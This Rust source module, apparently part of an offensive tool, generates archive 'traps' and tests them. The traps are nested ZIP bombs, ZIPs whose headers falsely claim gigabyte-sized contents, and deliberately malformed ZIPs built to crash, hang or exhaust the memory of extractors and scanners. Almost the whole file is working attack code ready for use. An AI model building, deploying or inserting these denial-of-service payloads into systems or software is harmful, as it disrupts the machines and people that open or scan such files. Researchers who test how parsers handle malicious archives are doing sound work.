// Compression trap / ZIP bomb generation.
//
// Variants:
//   nested_bomb  — N layers of nested ZIPs each with W inner archives; innermost
//                  files are DEFLATE-compressed zeros that expand massively.
//                  A 3-layer / 10-wide bomb produces W^N entries and can claim
//                  gigabytes on extraction.
//   oversized     — ZIP whose Central Directory claims huge uncompressed sizes
//                  while actual data is tiny; many tools OOM on parse.
//   malformed     — structurally broken ZIPs (bad CRC, truncated data, corrupt CDR)
//                  that cause extractor crashes or spin loops.
//
// No external crates required beyond flate2 (already in Cargo.toml).

use std::fs;
use std::io::Write;

use flate2::{write::DeflateEncoder, Compression};

// ── ZIP format primitives ─────────────────────────────────────────────────────

const PK_LOCAL: [u8; 4] = [0x50, 0x4B, 0x03, 0x04]; // local file header sig
const PK_CENTRAL: [u8; 4] = [0x50, 0x4B, 0x01, 0x02]; // central dir header sig
const PK_EOCD: [u8; 4] = [0x50, 0x4B, 0x05, 0x06]; // end of central dir sig

fn u16le(v: u16) -> [u8; 2] {
    v.to_le_bytes()
}
fn u32le(v: u32) -> [u8; 4] {
    v.to_le_bytes()
}

struct ZipEntry {
    name: Vec<u8>,
    compressed: Vec<u8>,
    uncompressed_size: u32,
    method: u16, // 0=STORED, 8=DEFLATE
    crc32: u32,
    _local_offset: u32, // reserved for future use
}

fn crc32(data: &[u8]) -> u32 {
    // CRC-32 (ISO 3309) — without external crate
    static mut TABLE: [u32; 256] = [0u32; 256];
    static mut INIT: bool = false;
    unsafe {
        if !INIT {
            for n in 0u32..256 {
                let mut c = n;
                for _ in 0..8 {
                    c = if c & 1 != 0 {
                        0xEDB8_8320 ^ (c >> 1)
                    } else {
                        c >> 1
                    };
                }
                TABLE[n as usize] = c;
            }
            INIT = true;
        }
        let mut c = !0u32;
        for &b in data {
            c = TABLE[((c ^ b as u32) & 0xFF) as usize] ^ (c >> 8);
        }
        !c
    }
}

fn deflate_zeros(uncompressed_len: usize) -> Vec<u8> {
    let zeros = vec![0u8; uncompressed_len];
    let mut enc = DeflateEncoder::new(Vec::new(), Compression::best());
    enc.write_all(&zeros).unwrap();
    enc.finish().unwrap()
}

fn build_zip(entries: &[ZipEntry]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::new();
    let mut offsets: Vec<u32> = Vec::new();

    // Local file headers + data
    for e in entries {
        offsets.push(out.len() as u32);
        out.extend(&PK_LOCAL);
        out.extend(u16le(20)); // version needed: 2.0
        out.extend(u16le(0)); // flags
        out.extend(u16le(e.method));
        out.extend(u16le(0));
        out.extend(u16le(0)); // mod time, mod date
        out.extend(u32le(e.crc32));
        out.extend(u32le(e.compressed.len() as u32));
        out.extend(u32le(e.uncompressed_size));
        out.extend(u16le(e.name.len() as u16));
        out.extend(u16le(0)); // extra len
        out.extend(&e.name);
        out.extend(&e.compressed);
    }

    let cdr_start = out.len() as u32;

    // Central directory
    for (i, e) in entries.iter().enumerate() {
        out.extend(&PK_CENTRAL);
        out.extend(u16le(20)); // version made by
        out.extend(u16le(20)); // version needed
        out.extend(u16le(0)); // flags
        out.extend(u16le(e.method));
        out.extend(u16le(0));
        out.extend(u16le(0)); // mod time, date
        out.extend(u32le(e.crc32));
        out.extend(u32le(e.compressed.len() as u32));
        out.extend(u32le(e.uncompressed_size));
        out.extend(u16le(e.name.len() as u16));
        out.extend(u16le(0));
        out.extend(u16le(0)); // extra, comment len
        out.extend(u16le(0));
        out.extend(u16le(0)); // disk start, int attrs
        out.extend(u32le(0)); // ext attrs
        out.extend(u32le(offsets[i]));
        out.extend(&e.name);
    }

    let cdr_end = out.len() as u32;
    let cdr_size = cdr_end - cdr_start;

    // End of central directory record
    out.extend(&PK_EOCD);
    out.extend(u16le(0));
    out.extend(u16le(0)); // disk number, CDR disk
    out.extend(u16le(entries.len() as u16)); // entries on this disk
    out.extend(u16le(entries.len() as u16)); // total entries
    out.extend(u32le(cdr_size));
    out.extend(u32le(cdr_start));
    out.extend(u16le(0)); // comment len

    out
}

// ── Public API ────────────────────────────────────────────────────────────────

pub struct BombOpts {
    pub layers: u32,           // nesting depth (3–5 typical)
    pub width: u32,            // archives per layer (10 typical)
    pub leaf_uncomp_size: u32, // uncompressed bytes per leaf file (10 MiB typical)
    pub verbose: bool,
}

impl Default for BombOpts {
    fn default() -> Self {
        Self {
            layers: 3,
            width: 10,
            leaf_uncomp_size: 10 * 1024 * 1024,
            verbose: false,
        }
    }
}

#[derive(Default)]
pub struct TrapStats {
    pub files_created: u32,
    pub errors: u32,
}

/// Recursive nested ZIP bomb.
/// Layer 0 = outermost archive written to disk.
/// Layer `layers` = leaf files filled with zeros (high deflate ratio).
fn build_bomb_layer(depth: u32, layers: u32, width: u32, leaf_size: u32) -> Vec<u8> {
    if depth == layers {
        // Leaf: a STORED zero file with the stated size
        // (We compress it externally per entry)
        let compressed = deflate_zeros(leaf_size as usize);
        let crc = crc32(&vec![0u8; leaf_size as usize]);
        let entry = ZipEntry {
            name: b"data.bin".to_vec(),
            compressed,
            uncompressed_size: leaf_size,
            method: 8, // DEFLATE
            crc32: crc,
            _local_offset: 0,
        };
        return build_zip(&[entry]);
    }

    // Inner layer: W copies of the next layer as STORED entries
    let inner = build_bomb_layer(depth + 1, layers, width, leaf_size);
    let inner_crc = crc32(&inner);

    let entries: Vec<ZipEntry> = (0..width)
        .map(|i| ZipEntry {
            name: format!("l{}-{}.zip", depth + 1, i).into_bytes(),
            compressed: inner.clone(),
            uncompressed_size: inner.len() as u32,
            method: 0, // STORED — inner zip is already "compressed"
            crc32: inner_crc,
            _local_offset: 0,
        })
        .collect();

    build_zip(&entries)
}

pub fn create_nested_bomb(out_path: &str, opts: &BombOpts) -> TrapStats {
    let mut s = TrapStats::default();
    let bomb = build_bomb_layer(0, opts.layers, opts.width, opts.leaf_uncomp_size);
    match fs::write(out_path, &bomb) {
        Ok(_) => {
            s.files_created += 1;
            if opts.verbose {
                let claimed = opts.width.pow(opts.layers) as u64 * opts.leaf_uncomp_size as u64;
                eprintln!(
                    "[+] trap: nested bomb {} — {} B on disk, claims ~{} B extracted",
                    out_path,
                    bomb.len(),
                    claimed
                );
            }
        }
        Err(e) => {
            s.errors += 1;
            if opts.verbose {
                eprintln!("[!] trap: {}: {}", out_path, e);
            }
        }
    }
    s
}

/// Oversized ZIP: CDR claims files are huge, actual compressed data is tiny.
/// Forces allocators in naive parsers to OOM before reading any real data.
pub fn create_oversized_zip(out_path: &str, claimed_size_gb: u32, verbose: bool) -> TrapStats {
    let mut s = TrapStats::default();
    let claimed = claimed_size_gb as u64 * 1024 * 1024 * 1024;

    // One tiny STORED entry (a few bytes), CDR lies about uncompressed size
    let payload = b"SATAN2";
    let crc = crc32(payload);

    let mut out: Vec<u8> = Vec::new();

    // Local header with honest compressed size but false uncompressed size
    out.extend(&PK_LOCAL);
    out.extend(u16le(20));
    out.extend(u16le(0));
    out.extend(u16le(0));
    out.extend(u16le(0));
    out.extend(u16le(0));
    out.extend(u32le(crc));
    out.extend(u32le(payload.len() as u32)); // real compressed size
    out.extend(u32le(claimed.min(0xFFFF_FFFF) as u32)); // claimed uncompressed
    out.extend(u16le(8u16));
    out.extend(u16le(0u16)); // name "bigfile" len
    out.extend(b"bigfile.");
    out.extend(payload);

    let cdr_start = out.len() as u32;

    // CDR also claims the huge size
    out.extend(&PK_CENTRAL);
    out.extend(u16le(20));
    out.extend(u16le(20));
    out.extend(u16le(0));
    out.extend(u16le(0));
    out.extend(u16le(0));
    out.extend(u16le(0));
    out.extend(u32le(crc));
    out.extend(u32le(payload.len() as u32));
    out.extend(u32le(claimed.min(0xFFFF_FFFF) as u32));
    out.extend(u16le(8u16));
    out.extend(u16le(0u16));
    out.extend(u16le(0u16));
    out.extend(u16le(0));
    out.extend(u16le(0));
    out.extend(u32le(0));
    out.extend(u32le(0));
    out.extend(b"bigfile.");

    let cdr_size = out.len() as u32 - cdr_start;
    out.extend(&PK_EOCD);
    out.extend(u16le(0));
    out.extend(u16le(0));
    out.extend(u16le(1));
    out.extend(u16le(1));
    out.extend(u32le(cdr_size));
    out.extend(u32le(cdr_start));
    out.extend(u16le(0));

    match fs::write(out_path, &out) {
        Ok(_) => {
            s.files_created += 1;
            if verbose {
                eprintln!(
                    "[+] trap: oversized ZIP {} — claims {}GB, {} B actual",
                    out_path,
                    claimed_size_gb,
                    out.len()
                );
            }
        }
        Err(e) => {
            s.errors += 1;
            if verbose {
                eprintln!("[!] trap: {}: {}", out_path, e);
            }
        }
    }
    s
}

#[derive(Debug, Clone, Copy)]
pub enum MalformVariant {
    BadCrc,           // wrong CRC32 in CDR
    TruncatedData,    // local file data shorter than stated
    CorruptSignature, // replace PK\x03\x04 with garbage in one entry
    InfiniteRecurse,  // self-referential CDR (points into itself)
}

/// Malformed ZIP that triggers bugs in extractors (crash, spin, undefined behaviour).
pub fn create_malformed_zip(out_path: &str, variant: MalformVariant, verbose: bool) -> TrapStats {
    let mut s = TrapStats::default();
    let payload = deflate_zeros(1024);
    let real_crc = crc32(&vec![0u8; 1024]);

    let mut entry = ZipEntry {
        name: b"trap.bin".to_vec(),
        compressed: payload.clone(),
        uncompressed_size: 1024,
        method: 8,
        crc32: real_crc,
        _local_offset: 0,
    };

    match variant {
        MalformVariant::BadCrc => {
            entry.crc32 = 0xDEAD_BEEF;
        }
        MalformVariant::TruncatedData => {
            entry.compressed.truncate(payload.len() / 2);
        }
        _ => {}
    }

    let mut data = build_zip(&[entry]);

    match variant {
        MalformVariant::CorruptSignature => {
            // Overwrite the first local header signature
            data[0] = 0x00;
            data[1] = 0x00;
        }
        MalformVariant::InfiniteRecurse => {
            // Point EOCD CDR offset to EOCD itself (self-referential)
            if data.len() >= 22 {
                let eocd_off = (data.len() - 22) as u32;
                let self_ref = eocd_off.to_le_bytes();
                let cdr_off_pos = data.len() - 6;
                data[cdr_off_pos..cdr_off_pos + 4].copy_from_slice(&self_ref);
            }
        }
        _ => {}
    }

    match fs::write(out_path, &data) {
        Ok(_) => {
            s.files_created += 1;
            if verbose {
                eprintln!("[+] trap: malformed ZIP ({:?}) → {}", variant, out_path);
            }
        }
        Err(e) => {
            s.errors += 1;
            if verbose {
                eprintln!("[!] trap: {}: {}", out_path, e);
            }
        }
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;

    fn tmpdir(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!(
            "satan2-test-{}-{}-{}",
            tag,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    /// Standard CRC-32 check value ("123456789" → 0xCBF43926).
    #[test]
    fn crc32_check_vector() {
        assert_eq!(crc32(b"123456789"), 0xCBF4_3926);
        assert_eq!(crc32(b""), 0);
    }

    /// deflate_zeros output must inflate back to the original zero buffer.
    #[test]
    fn deflate_zeros_roundtrip() {
        let compressed = deflate_zeros(4096);
        assert!(
            compressed.len() < 100,
            "zeros must compress well: {}",
            compressed.len()
        );
        let mut dec = flate2::read::DeflateDecoder::new(&compressed[..]);
        let mut out = Vec::new();
        dec.read_to_end(&mut out).unwrap();
        assert_eq!(out, vec![0u8; 4096]);
    }

    /// A freshly built ZIP must have local header magic, an EOCD 22 bytes from
    /// the end, and a self-consistent central directory.
    #[test]
    fn build_zip_structure() {
        let entry = ZipEntry {
            name: b"hello.txt".to_vec(),
            compressed: b"hi there".to_vec(),
            uncompressed_size: 8,
            method: 0,
            crc32: crc32(b"hi there"),
            _local_offset: 0,
        };
        let zip = build_zip(&[entry]);
        assert_eq!(&zip[0..4], &PK_LOCAL, "missing local header magic");
        let eocd = &zip[zip.len() - 22..];
        assert_eq!(&eocd[0..4], &PK_EOCD, "EOCD must be the final record");
        assert_eq!(
            u16::from_le_bytes([eocd[10], eocd[11]]),
            1,
            "entry count wrong"
        );
        let cdr_off = u32::from_le_bytes(eocd[16..20].try_into().unwrap()) as usize;
        assert_eq!(
            &zip[cdr_off..cdr_off + 4],
            &PK_CENTRAL,
            "CDR offset does not point at CDR"
        );
    }

    #[test]
    fn nested_bomb_is_valid_zip_and_tiny() {
        let dir = tmpdir("trap-nested");
        let path = dir.join("bomb.zip");
        let ps = path.to_str().unwrap();
        let opts = BombOpts {
            layers: 2,
            width: 2,
            leaf_uncomp_size: 8192,
            verbose: false,
        };
        let stats = create_nested_bomb(ps, &opts);
        assert_eq!(stats.files_created, 1);
        assert_eq!(stats.errors, 0);

        let data = std::fs::read(&path).unwrap();
        assert_eq!(&data[0..4], &PK_LOCAL, "not a ZIP");
        let eocd = &data[data.len() - 22..];
        assert_eq!(&eocd[0..4], &PK_EOCD);
        assert_eq!(
            u16::from_le_bytes([eocd[10], eocd[11]]),
            2,
            "outer layer must have W entries"
        );

        // On-disk size must be orders of magnitude below the claimed total
        // (width^layers * leaf_size = 2^2 * 8192 = 32 KiB).
        let claimed = 2u64.pow(2) * 8192;
        assert!(
            (data.len() as u64) < claimed / 10,
            "bomb too large on disk: {} vs claimed {}",
            data.len(),
            claimed
        );

        // The innermost leaf must actually inflate to zeros — walk down two
        // layers of STORED inner ZIPs to reach the DEFLATE leaf entry.
        // Local header: [sig 4][ver 2][flags 2][method 2][time 2][date 2]
        //               [crc 4][comp_size 4][uncomp_size 4][name_len 2][extra_len 2]
        fn first_entry_data(zip: &[u8], at: usize) -> (usize, usize) {
            let name_len = u16::from_le_bytes([zip[at + 26], zip[at + 27]]) as usize;
            let comp_size = u32::from_le_bytes(zip[at + 18..at + 22].try_into().unwrap()) as usize;
            (at + 30 + name_len, comp_size)
        }
        let (l1_off, _) = first_entry_data(&data, 0);
        assert_eq!(
            &data[l1_off..l1_off + 4],
            &PK_LOCAL,
            "layer-1 zip not embedded"
        );
        let (l2_off, _) = first_entry_data(&data, l1_off);
        assert_eq!(
            &data[l2_off..l2_off + 4],
            &PK_LOCAL,
            "layer-2 zip not embedded"
        );
        let (leaf_off, leaf_len) = first_entry_data(&data, l2_off);
        let leaf = &data[leaf_off..leaf_off + leaf_len];
        let mut dec = flate2::read::DeflateDecoder::new(leaf);
        let mut out = Vec::new();
        dec.read_to_end(&mut out).unwrap();
        assert_eq!(
            out.len(),
            8192,
            "leaf must inflate to leaf_uncomp_size zeros"
        );
        assert!(out.iter().all(|&b| b == 0));

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn oversized_zip_lies_about_size() {
        let dir = tmpdir("trap-oversized");
        let path = dir.join("big.zip");
        let ps = path.to_str().unwrap();
        let stats = create_oversized_zip(ps, 2, false);
        assert_eq!(stats.files_created, 1);

        let data = std::fs::read(&path).unwrap();
        assert_eq!(&data[0..4], &PK_LOCAL);
        // Local header: uncompressed size (offset 22) must claim 2 GiB...
        let claimed = u32::from_le_bytes(data[22..26].try_into().unwrap());
        assert_eq!(claimed, 2 * 1024 * 1024 * 1024);
        // ...while the compressed size (offset 18) is the 6-byte payload
        let real = u32::from_le_bytes(data[18..22].try_into().unwrap());
        assert_eq!(real, 6);
        assert!(data.len() < 4096, "oversized zip must be tiny on disk");

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn malformed_zip_variants() {
        let dir = tmpdir("trap-malformed");

        let bad_crc = dir.join("badcrc.zip");
        create_malformed_zip(bad_crc.to_str().unwrap(), MalformVariant::BadCrc, false);
        let data = std::fs::read(&bad_crc).unwrap();
        assert_eq!(
            u32::from_le_bytes(data[14..18].try_into().unwrap()),
            0xDEAD_BEEF,
            "bad CRC not injected into local header"
        );

        let truncated = dir.join("trunc.zip");
        create_malformed_zip(
            truncated.to_str().unwrap(),
            MalformVariant::TruncatedData,
            false,
        );
        let data = std::fs::read(&truncated).unwrap();
        // The header claims 1024 uncompressed bytes, but the deflate stream was
        // cut in half — inflating the stored data must fail or come up short.
        let stated_uncomp = u32::from_le_bytes(data[22..26].try_into().unwrap()) as usize;
        assert_eq!(stated_uncomp, 1024);
        let comp_size = u32::from_le_bytes(data[18..22].try_into().unwrap()) as usize;
        let name_len = u16::from_le_bytes([data[26], data[27]]) as usize;
        let payload = &data[30 + name_len..30 + name_len + comp_size];
        let mut dec = flate2::read::DeflateDecoder::new(payload);
        let mut out = Vec::new();
        let inflated = dec.read_to_end(&mut out).unwrap_or(0);
        assert!(
            inflated < stated_uncomp,
            "truncated stream must not fully inflate"
        );

        let corrupt = dir.join("corrupt.zip");
        create_malformed_zip(
            corrupt.to_str().unwrap(),
            MalformVariant::CorruptSignature,
            false,
        );
        let data = std::fs::read(&corrupt).unwrap();
        assert_ne!(&data[0..4], &PK_LOCAL, "signature must be corrupted");

        let recurse = dir.join("recurse.zip");
        create_malformed_zip(
            recurse.to_str().unwrap(),
            MalformVariant::InfiniteRecurse,
            false,
        );
        let data = std::fs::read(&recurse).unwrap();
        let eocd_off = data.len() - 22;
        let cdr_off = u32::from_le_bytes(data[eocd_off + 16..eocd_off + 20].try_into().unwrap());
        assert_eq!(
            cdr_off as usize, eocd_off,
            "CDR offset must point at EOCD itself"
        );

        std::fs::remove_dir_all(&dir).ok();
    }
}
